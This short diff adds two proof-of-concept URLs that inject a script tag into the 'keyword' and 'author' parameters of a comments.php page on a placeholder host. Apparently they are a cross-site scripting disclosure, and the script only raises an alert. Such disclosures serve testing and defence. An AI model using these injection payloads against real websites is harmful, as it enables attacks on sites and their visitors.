@@ -1,0 +1,3 @@
+http://www.example.com/comments.php?keyword=&lt;script&gt;alert(/Vulnerable/.source)&lt;/script&gt;&since=
+http://www.example.com/comments.php?author=&lt;script&gt;alert(/Vulnerable/.source)&lt;/script&gt;&since=
+
